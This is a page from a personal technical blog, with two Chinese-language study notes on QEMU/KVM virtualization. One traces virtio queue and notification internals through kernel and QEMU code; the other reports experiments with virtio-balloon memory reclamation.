<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"szy0127.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"preload":true}}</script><script src="/js/config.js"></script>

    <meta property="og:type" content="website">
<meta property="og:title" content="S blog">
<meta property="og:url" content="http://szy0127.github.io/page/2/index.html">
<meta property="og:site_name" content="S blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="szy">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://szy0127.github.io/page/2/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"page/2/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>S blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">S blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">szy</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">25</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/01/22/virtualization/virtio%20queue/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/01/22/virtualization/virtio%20queue/" class="post-title-link" itemprop="url">virtio queue</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2024-01-22 20:57:59 / Modified: 20:58:17" itemprop="dateCreated datePublished" datetime="2024-01-22T20:57:59+08:00">2024-01-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/virtualization/" itemprop="url" rel="index"><span itemprop="name">virtualization</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>5.6k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>20 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="virtio-queue"><a href="#virtio-queue" class="headerlink" title="virtio queue"></a>virtio queue</h1><h2 id="消息机制"><a href="#消息机制" class="headerlink" title="消息机制"></a>消息机制</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wangquan1992/article/details/120649182">virtio-net 实现机制_sg_init_one_老王不让用的博客-CSDN博客</a></p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>简单设计：一个环形队列 固定大小 生产者消费者 两个指针</p>
<p>这样所有通信固定在了这个队列里</p>
<p>virtio可以动态申请和释放共享内存，用一块固定的共享内存队列记录通信使用的共享内存的地址</p>
<p>这个队列为desc 默认128长度</p>
<p>真正的共享内存是scatterlist</p>
<p>并且 desc并不是单纯的先进先出的队列，而是一个无序的链表，所有请求不需要顺序处理 所以两个指针是不够的 必须记录哪些位置是新生产的  哪些位置被消费了</p>
<p>实现中用数组 分别索引</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vring_create_virtqueue</span><br><span class="line">vring_create_virtqueue_split</span><br><span class="line">vring_alloc_queue_split</span><br><span class="line">	-&gt; vring_split-&gt;vring.desc = vring_alloc_queue(num)</span><br></pre></td></tr></table></figure>

<p>前者是avai ring qemu把新请求的desc id放在里面  然后更新这个avai ring的index</p>
<p>qemu会维护这个avai ring的last index 然后avai_ring[last_index]读到desc id desc[desc_id]读到真正的信息的共享内存地址 然后再读数据 </p>
<p>同理 use ring表示另一侧</p>
<p>实现中 desc avail used用的是一块连续的物理内存</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vstatic <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">vring_init</span><span class="params">(<span class="keyword">struct</span> vring *vr, <span class="type">unsigned</span> <span class="type">int</span> num, <span class="type">void</span> *p,</span></span><br><span class="line"><span class="params">			      <span class="type">unsigned</span> <span class="type">long</span> align)</span></span><br><span class="line">&#123;</span><br><span class="line">	vr-&gt;num = num;</span><br><span class="line">	vr-&gt;desc = p;</span><br><span class="line">	vr-&gt;avail = (<span class="keyword">struct</span> vring_avail *)((<span class="type">char</span> *)p + num * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> vring_desc));</span><br><span class="line">	vr-&gt;used = (<span class="type">void</span> *)(((<span class="type">uintptr_t</span>)&amp;vr-&gt;avail-&gt;ring[num] + <span class="keyword">sizeof</span>(__virtio16)</span><br><span class="line">		+ align<span class="number">-1</span>) &amp; ~(align - <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="guest"><a href="#guest" class="headerlink" title="guest"></a>guest</h3><p>scatterlist是内核数据结构 只是记录了page地址 并没有读数据</p>
<p><code>sg-&gt;page_link = (unsigned long)page</code></p>
<p>调用vring_map_one_sg-&gt;sg_phys拿到gpa记录在desc中</p>
<p>sg-&gt;length就是buflen 即pfn个数乘长度(4字节 最多256个 共1024字节)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">desc[i].addr = vring_map_one_sg(sg)</span><br><span class="line">desc[i].len = sg-&gt;length</span><br><span class="line"></span><br><span class="line">vring.avail-&gt;ring[avail] = i</span><br><span class="line">vring.avail-&gt;idx++</span><br></pre></td></tr></table></figure>

<p>这里把地址展开 其实就是sg-&gt;page_link 也就是page的地址 GPA</p>
<p>所以这里sg用的buf 必须也是提前制定好的共享内存 相当于绕了一圈回来了 最终还是一块固定的共享内存</p>
<p>并且sg本身存了个地址 然后又拿了地址 跟sg没什么关系 qemu这边也并不会访问到sg 只是为了复用一些函数？</p>
<p>是virtio_balloon结构体中的pfns数组</p>
<p>每次balloon guest把pfn写在这块固定的共享内存上(pfns) 然后把这个地址写到一个sg中 再把这个地址写到desc中 再把desc索引写到avail中 qemu从avail拿到desc索引 再拿pfns地址  传来传去就是一个固定的地址 </p>
<h3 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h3><p>从avail拿到desc索引</p>
<p>从desc拿到GPA 转成HVA</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">i = vring_avail_ring(last_avail_idx++)</span><br><span class="line">vring_split_desc_read(&amp;desc,i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">virtqueue_map_desc(desc.addr,desc.len)&#123;</span><br><span class="line">	iov[0].iov_base = dma_memory_map(desc.addr)</span><br><span class="line">	iov[0].iov_len = desc.len</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里dma_memory_map-&gt;address_space_map把GPA转为HVA 但是代码实现看起来非常复杂</p>
<blockquote>
<p>Map a physical memory region into a host virtual address</p>
</blockquote>
<p>用HVA copy guest的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">elem = virtqueue_pop(vq,sizeof(VirtQueueElement));</span><br><span class="line">while(iov_to_buf(elem-&gt;out_sg,elem-&gt;out_num,offset,&amp;pfn,4)==4)</span><br><span class="line"></span><br><span class="line">if(offset &lt;= iov[0].iov_len)</span><br><span class="line">	memcpy(buf,iov[0].iov_base + offset,bytes)</span><br></pre></td></tr></table></figure>

<h3 id="used"><a href="#used" class="headerlink" title="used"></a>used</h3><h2 id="通知机制"><a href="#通知机制" class="headerlink" title="通知机制"></a>通知机制</h2><h3 id="glib"><a href="#glib" class="headerlink" title="glib"></a>glib</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73494896/article/details/127011228">详细介绍Glib 主事件循环轻度分析与编程应用_g_main_loop_run_极致Linux内核的博客-CSDN博客</a></p>
<p>事件循环</p>
<p>例如connect拿到fd  glib会包装poll 响应时dispatch调用callback</p>
<h3 id="eventfd"><a href="#eventfd" class="headerlink" title="eventfd"></a>eventfd</h3><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/40572954">让事件飞 ——Linux eventfd 原理与实践 - 知乎 (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/393748176">Linux fd 系列 — eventfd 是什么？ - 知乎 (zhihu.com)</a></p>
<p>一个eventfd维护一个8bit的整型 write对应累加 read对应清零</p>
<p>当值是0时read会阻塞</p>
<p>producer用write 1 consumer用read实现阻塞</p>
<h3 id="mmio"><a href="#mmio" class="headerlink" title="mmio"></a>mmio</h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/9Zv7XcsvlVwDDjTn85-SZQ">Linux虚拟化KVM-Qemu分析（十二）之ioeventfd与irqfd (qq.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/huang987246510/article/details/105618557">qemu中的eventfd——ioeventfd_享乐主的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1518217">virtIO前后端notify机制详解-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<ol>
<li>mmio的地址不能提交给kvm然后让guest访问 应该qemu来模拟，这里模拟的写操作会到<code>virtio_pci_config_write</code>处理</li>
<li>为了提高效率 mmio的地址与eventfd绑定，kvm不需要回到qemu 而是直接通过eventfd通知qemu</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps virtio_pci_config_ops = &#123;</span><br><span class="line">    .read = virtio_pci_config_read,</span><br><span class="line">    .write = virtio_pci_config_write,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_pci_bus_class_init</span><span class="params">(ObjectClass *klass, <span class="type">void</span> *data)</span>&#123;</span><br><span class="line">	k-&gt;set_guest_notifiers = virtio_pci_set_guest_notifiers;</span><br><span class="line">    	-&gt;virtio_pci_set_guest_notifier</span><br><span class="line">            -&gt;event_notifier_init	</span><br><span class="line">            	-&gt;eventfd</span><br><span class="line">	k-&gt;device_plugged = virtio_pci_device_plugged;</span><br><span class="line">    	-&gt;memory_region_init_io(&amp;proxy-&gt;bar, OBJECT(proxy),&amp;virtio_pci_config_ops,</span><br><span class="line">			proxy, <span class="string">&quot;virtio-pci&quot;</span>, size);</span><br><span class="line">    k-&gt;ioeventfd_assign = virtio_pci_ioeventfd_assign;</span><br><span class="line">    	-&gt;memory_region_add_eventfd-&gt;memory_region_transaction_commit-&gt;address_space_update_ioeventfds-&gt;address_space_add_del_ioeventfds-&gt;MEMORY_LISTEMER_CALL(eventfd_add)</span><br><span class="line">            -&gt;kvm_set_ioeventfd_mmio</span><br><span class="line">            	-&gt;kvm_vm_ioctl(kvm_state, KVM_IOEVENTFD, &amp;iofd);</span><br><span class="line">&#125;</span><br><span class="line">kvm</span><br><span class="line">kvm_assign_ioeventfd_idx</span><br></pre></td></tr></table></figure>

<p>qemu端 virt queue 注册handle_output<code>typedef void (*VirtIOHandleOutput)(VirtIODevice *, VirtQueue *);</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">memory_region_dispatch_write</span><br><span class="line">memory_region_write_accessor</span><br><span class="line">virtio_pci_config_write</span><br><span class="line">virtio_ioport_write&#123;</span><br><span class="line">	<span class="keyword">case</span> VIRTIO_PCI_QUEUE_NOTIFY:</span><br><span class="line">        virtio_queue_notify(vdev, val);</span><br><span class="line">        	-&gt;<span class="keyword">if</span>(vq-&gt;host_notifier_enabled)</span><br><span class="line">                event_notifier_set(&amp;vq-&gt;host_notifier);</span><br><span class="line">    		<span class="keyword">else</span>	vq-&gt;handle_output(vdev,vq)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>guest </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">virtqueue_kick</span><br><span class="line">virtqueue_notify</span><br><span class="line"><span class="type">bool</span> <span class="title function_">vp_notify</span><span class="params">(<span class="keyword">struct</span> virtqueue *vq)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* we write the queue&#x27;s selector into the notification register to</span></span><br><span class="line"><span class="comment">	 * signal the other end */</span></span><br><span class="line">	iowrite16(vq-&gt;index, vp_dev-&gt;ldev.ioaddr + VIRTIO_PCI_QUEUE_NOTIFY);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>kvm</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">handle_ept_misconfig</span><span class="params">(<span class="keyword">struct</span> kvm_vcpu *vcpu)</span>&#123;</span><br><span class="line">    gpa = vmcs_read64(GUEST_PHYSICAL_ADDRESS);</span><br><span class="line">	<span class="keyword">if</span> (!is_guest_mode(vcpu) &amp;&amp;</span><br><span class="line">	    !kvm_io_bus_write(vcpu, KVM_FAST_MMIO_BUS, gpa, <span class="number">0</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        	-&gt;ioeventfd_write</span><br><span class="line">                -&gt;eventfd_signal (counter增加 唤醒)</span><br><span class="line">        <span class="comment">//正常执行返回0 提前退出</span></span><br><span class="line">		<span class="keyword">return</span> kvm_skip_emulated_instruction(vcpu);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里返回0 会让kvm进入下一次vcpu_run的循环 不会退出ioctl到qemu</p>
<p>qemu在哪里等待这个eventfd  被唤醒后如何处理 网上没有相关的介绍</p>
<blockquote>
<p>host通知guest当然是通过注入中断的方式，首先调用的是virtio_notify，继而调用virtio_notify_vector并把中断向量作为参数传递进去。这里就调用了设备关联的notify函数，具体实现为virtio_pci_notify函数，常规中断（非MSI）会调用qemu_set_irq，在8259a中断控制器的情况下回调用kvm_pic_set_irq，然后到了kvm_set_irq，这里就会通过kvm_vm_ioctl和KVM交互，接口为KVM_IRQ_LINE，通知KVM对guest进行中断的注入。KVm里的kvm_vm_ioctl函数会对此调用进行处理，具体就是调用kvm_vm_ioctl_irq_line，之后就调用kvm_set_irq函数进行注入了。之后的流程参看中断虚拟化部分。</p>
</blockquote>
<p>hw&#x2F;virtio&#x2F;virtio-pci.c</p>
<p>virio_ioport_write</p>
<p>virtio_pci_config_ops</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42681961/article/details/82827911">qemu-kvm 对mmio的模拟_qemu mmio-CSDN博客</a></p>
<p>guest:</p>
<p>drivers&#x2F;virtio&#x2F;virtio_pci_legacy.c</p>
<p>vq-&gt;priv &#x3D; … VIRTIO_PCI_QUEUE_NOTIFY</p>
<p>qemu:</p>
<p>memory_region_add_eventfd(VIRTIO_PCI_QUEUE_NOTIFY)</p>
<p><a href="read://https_blog.csdn.net/?url=https%3A%2F%2Fblog.csdn.net%2Fqq_41596356%2Farticle%2Fdetails%2F128441953">virtio前端驱动通知机制分析 (csdn.net)</a></p>
<p>这里说</p>
<blockquote>
<p><code>iowrite VIRTIO_PCI_QUEUE_NOTIFY</code> 后会产生一个 <code>vm-exit</code>，<code>KVM</code> 会判断 <code>exit_reason</code>， <code>I/O</code> 操作对应的执行函数是 <code>virtio_ioport_write()</code> 。</p>
</blockquote>
<p>kvm使用的eventfd来自do_eventfd  在fs&#x2F;eventfd.c</p>
<p>qemu在哪里用？</p>
<p><a target="_blank" rel="noopener" href="https://tinylab.org/qemu-vhost/">Qemu vhost 原理分析 - 泰晓科技 (tinylab.org)</a> 3.1节 有完整的调用路径 但是是需要kvm退回到qemu的 </p>
<p>guest中balloon直接循环virtqueue_notify</p>
<p>qemu中accel&#x2F;kvm&#x2F;kvm-all.c kvm_cpu_exec加代码统计 是mmio</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kvm_cpu_exec</span><br><span class="line">	-&gt;address_space_rw</span><br><span class="line">		-&gt;address_space_write</span><br><span class="line">			-&gt;memory_region_dispatch_write</span><br></pre></td></tr></table></figure>



<p>kvm</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">npf_interception</span><br><span class="line">	-&gt;kvm_mmu_page_fault</span><br><span class="line">    	-&gt;x86_emulate_instruction</span><br><span class="line">            -&gt;x86_emulate_insn</span><br><span class="line">                -&gt;writeback</span><br><span class="line">                    -&gt;segmented_write</span><br><span class="line">                        -&gt;emulator_write_emulated</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/01/22/virtualization/balloon/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/01/22/virtualization/balloon/" class="post-title-link" itemprop="url">balloon</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2024-01-22 20:57:11" itemprop="dateCreated datePublished" datetime="2024-01-22T20:57:11+08:00">2024-01-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/virtualization/" itemprop="url" rel="index"><span itemprop="name">virtualization</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>14k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>51 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="balloon"><a href="#balloon" class="headerlink" title="balloon"></a>balloon</h1><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ul>
<li>guest使用的内核在编译时需要把config_virtio_balloon的选项打开，可以y直接编译进内核 也可以m作为模块手动加载</li>
<li>qemu启动时加入virtio-balloon选项</li>
</ul>
<p>进入虚拟机后ctrl a c进入qemu monitor</p>
<ul>
<li>info balloon查看当前balloon大小，默认为qemu启动时指定的最大内存</li>
<li>balloon xxx(mb) 调整大小</li>
</ul>
<p>显示的balloon大小为VM真实可用的内存，剩下的给host</p>
<ul>
<li>如果不加入deflate-on-oom参数，VMfree -mh显示内存为balloon大小 超过此大小触发oom killer</li>
<li>如果加入此参数，VM free -mh显示启动指定的最大参数，但是used显示分给host的值 超过balloon大小会自动调大balloon</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.linux-kvm.org/page/Projects/auto-ballooning#TODO">Projects&#x2F;auto-ballooning - KVM (linux-kvm.org)</a></p>
<p>auto balloon似乎被废弃了</p>
<p><a target="_blank" rel="noopener" href="https://www.ovirt.org/develop/projects/mom.html">MoM | oVirt</a>这个工具可能可用</p>
<p>qmp:</p>
<ul>
<li>balloon  value</li>
<li>query-balloon</li>
</ul>
<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><p>host guest1 guest2均为4G内存</p>
<ol>
<li>guest1要2G 从内存分配</li>
<li>guest2要2G swap掉guest1</li>
<li>guest1要2G swap掉guest2</li>
</ol>
<p><strong>1 正常情况  guest2要内存 host内存不够 回收 但是guest1的2G被swap</strong> 从htop中guest1的qemu 进程mem占用情况可以看出来</p>
<p>ctrl a c 输入info balloon &#x2F;balloon xxx (MB)</p>
<p>balloon后面的数字代表VM真实可用内存(不参与balloon) 这个值不能超过qemu启动分配的内存</p>
<p>balloon目前找不到合适的自动化监控，需要手动用qemu调</p>
<p><strong>2 guest2需要很多内存的时候手动进guest1的qemu monitor 调小balloon 然后reclaim会直接回收而不是swap</strong></p>
<p>balloon只会回收guest内存 不会回收host上被swap的guest的页</p>
<p><a target="_blank" rel="noopener" href="https://zhidao.baidu.com/question/1519495184466483140.html">KVM之四：内存balloon的奇妙_百度知道 (baidu.com)</a></p>
<blockquote>
<p>目前没有比较方便的、自动化的机制来管理ballooning，一般都是采用在QEMU monitor中执行balloon命令来实现ballooning的。没有对VM的有效监控，没有自动化的ballooning机制，这可能会让生产环境中实现大规模自动化部署并不很方便。</p>
</blockquote>
<p><strong>3 如果memhog后sleep 持续占用内存 那balloon会直接把这个进程kill掉 强行拿掉VM的内存</strong></p>
<p>所以用balloon和不用在结果上是有很大区别的。不用balloon host会把VM的所有内存都swap掉 不管free与否；用balloon host会强行回收VM内存 如果不够就让VMkill自己的进程 </p>
<p><strong>4 如果VM配了 swap VM会swap</strong></p>
<blockquote>
<p>如果有大量内存从VM系统中回收，Ballooning可能会降低VM操作系统运行的性能。一方面，内存的减少，可能会让VM中作为磁盘数据缓存的内存被放到气球中，从而VM中的磁盘I&#x2F;O访问会增加；另一方面，如果处理机制不够好，也可能让VM中正在运行的进程由于内存不足而执行失败。</p>
</blockquote>
<p>[<a target="_blank" rel="noopener" href="https://listman.redhat.com/archives/libvir-list/2015-December/msg00494.html">libvirt] [PATCH 2&#x2F;2] qemu: add support of optional ‘deflate-on-oom’ attribute (redhat.com)</a></p>
